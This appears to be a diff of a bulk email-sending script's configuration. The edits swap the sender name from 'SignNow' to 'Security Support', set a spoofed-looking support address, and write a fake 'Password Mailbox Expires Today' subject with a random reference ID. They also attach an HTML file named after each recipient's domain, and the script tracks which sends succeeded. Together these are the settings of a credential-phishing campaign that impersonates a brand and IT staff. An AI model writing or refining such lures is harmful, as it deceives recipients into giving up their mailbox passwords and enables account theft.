@@ -122,10 +122,10 @@ const options = {
 
 
 const attachmentNameWithPlaceholders = 'call_playback_{RECIPIENT_DOMAIN_NAME}.html';
-const senderAddresses = ['carnecrea@fucrea.org'];
+const senderAddresses = ['support@fucrea.org'];
 const messageFile = 'message.html';
-const senderNameWithPlaceholders = "SignNow"; 
-const subjectLineWithPlaceholders = "URGENT";
+const senderNameWithPlaceholders = "Security Support"; 
+const subjectLineWithPlaceholders = "Reminder: Password Mailbox Expires Today | REFID-{RANDOM_MD5}";
 const MAX_RETRIES = 3; 
 const SUCCESS_FILE = 'success-emails.txt';
 const FAILURE_FILE = 'failed-emails.txt';
